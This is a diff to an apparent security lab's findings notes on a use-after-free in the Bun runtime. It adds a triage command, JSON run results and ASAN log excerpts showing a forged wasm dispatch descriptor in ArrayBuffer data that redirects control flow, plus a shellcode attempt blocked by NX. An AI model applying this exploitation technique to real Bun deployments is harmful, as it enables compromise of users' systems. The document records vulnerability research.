@@ -133,6 +133,84 @@ After the write:
 * marker mode creates `/tmp/bun_uaf_noffi_wasm_marker`
 * restoring the original qword makes `a()` return `42` again
 
+## Forged descriptor follow-up
+
+The offset-48 value does not need to point at JSC's original 8-byte descriptor
+allocation. It can be replaced with the backing pointer of an attacker-controlled
+`ArrayBuffer` whose first qword contains the replacement descriptor word.
+
+Command:
+
+```sh
+rm -f /tmp/bun_uaf_noffi_wasm_marker
+ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
+TIMEOUT=240 MARKER_IMPORT=1 FAKE_DESCRIPTOR=1 FAKE_DESCRIPTOR_MODE=replacement \
+MARKER_PATH=/tmp/bun_uaf_noffi_wasm_marker \
+lab/scripts/triage.sh \
+  lab/harnesses/13-arb-rw-probes/wasm-export-code-pointer-redirect-probe.js
+```
+
+Run:
+
+`lab/findings/runs/20260510T090712Z-96252/asan.log`
+
+Key facts:
+
+```json
+{
+  "fakeDescriptor": true,
+  "fakeDescriptorMode": "replacement",
+  "fakeDescriptorSummary": {
+    "dataAddress": "0x00006020001a9790",
+    "originalDescriptorWord": "0x0000000129e3c300",
+    "replacementDescriptorWord": "0x0000000129e98000",
+    "fakeDescriptorWord": "0x0000000129e98000"
+  },
+  "effectiveReplacementPatchValue": "0x00006020001a9790",
+  "markerBefore": false,
+  "markerAfter": true,
+  "patchedA": 7,
+  "restoredA": 42,
+  "ok": true
+}
+```
+
+Control run:
+
+`lab/findings/runs/20260510T090344Z-83785/asan.log`
+
+When the forged descriptor contains export `a`'s original qword instead of
+export `b`'s qword, `a()` remains `42` and the marker file is not created:
+
+```json
+{
+  "fakeDescriptorMode": "original",
+  "markerBefore": false,
+  "markerAfter": false,
+  "patchedA": 42,
+  "restoredA": 42
+}
+```
+
+This confirms that the forged descriptor's first qword selects the wasm dispatch
+target under the tested build.
+
+Direct heap shellcode is still blocked. A destructive `data-ret` probe placed an
+ARM64 `ret` instruction in an `ArrayBuffer`, set the forged descriptor qword to
+that backing-store address, and called `a()`. ASAN reported a BUS fault with the
+program counter in the `0x602...` ArrayBuffer data allocation:
+
+`lab/findings/runs/20260510T090500Z-87643/asan.log`
+
+```text
+ERROR: AddressSanitizer: BUS on unknown address
+pc 0x6020001a5350
+```
+
+That establishes the expected NX/W^X boundary for direct ArrayBuffer shellcode.
+The useful primitive is therefore forged dispatch to already-executable wasm/JIT
+code pointers, not direct execution from JS heap data.
+
 ## Current impact
 
 Confirmed:
@@ -140,6 +218,7 @@ Confirmed:
 * no-FFI native memory view over known valid in-process addresses
 * no-FFI write to a WebAssembly export function cell
 * no-FFI redirect from one same-signature wasm export body to another
+* no-FFI forged wasm dispatch descriptor in attacker-controlled ArrayBuffer data
 * marker file creation through the redirected wasm export path
 * clean restoration of the corrupted export metadata after the call
 
